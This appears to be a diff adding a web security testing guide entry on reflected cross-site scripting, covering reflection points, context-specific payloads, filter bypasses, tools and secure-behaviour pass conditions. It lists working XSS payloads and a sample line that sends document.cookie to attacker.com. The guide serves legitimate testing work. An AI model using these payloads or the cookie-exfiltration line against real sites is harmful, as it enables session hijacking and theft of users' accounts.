@@ -1,0 +1,44 @@
+WSTG-INPV-01: Testing for Reflected Cross Site Scripting
+
+Summary:
+Reflected XSS occurs when user-supplied input is immediately included in the HTML response without proper sanitization or encoding. Unlike stored XSS, the malicious payload is not persisted but is delivered to victims through crafted URLs or forms (typically via phishing). The script executes in the victim's browser under the application's origin.
+
+Test Objectives:
+- Identify all input vectors reflected in the HTML response
+- Determine whether the application encodes user input in all output contexts
+- Assess the impact (session hijacking, credential theft, DOM manipulation)
+
+How to Test:
+
+1. Identify Reflection Points
+   - Send a unique benign string (e.g., xss12345) in every input parameter
+   - Inspect the response to identify where the string appears (HTML body, attributes, JavaScript, URL)
+   - Map the context: HTML content, attribute value, JavaScript variable, URL query string
+
+2. Context-Specific Payloads
+   - HTML body context: <script>alert(1)</script>, <img src=x onerror=alert(1)>
+   - HTML attribute context: " onmouseover="alert(1), ' onload='alert(1)
+   - JavaScript context: ';alert(1)//, \';alert(1)//
+   - URL context: javascript:alert(1)
+
+3. Filter Bypass Techniques
+   - Case variation: <ScRiPt>, <SCRIPT>
+   - Encoding: &#x3c;script&#x3e;, %3cscript%3e
+   - Event handlers: <svg onload=alert(1)>, <body onpageshow=alert(1)>
+   - Without parentheses: <img src=x onerror=alert`1`>
+
+4. Impact Assessment
+   - Demonstrate session cookie theft: <script>document.location='http://attacker.com/?c='+document.cookie</script>
+   - Check if HttpOnly flag prevents cookie access (reduces impact but doesn't eliminate XSS)
+
+Tools:
+   - Burp Suite (Intruder/Repeater for payload injection)
+   - XSStrike: automated XSS scanner with context-aware payloads
+   - OWASP ZAP: active XSS scanner
+
+Expected Secure Behavior (Pass Conditions):
+- All user input reflected in HTML output is HTML-entity-encoded
+- Content-Security-Policy header present and restricts inline scripts
+- X-XSS-Protection header set (legacy browsers)
+- Output encoding is context-appropriate (HTML, JS, URL, CSS contexts)
+- HttpOnly flag set on session cookies
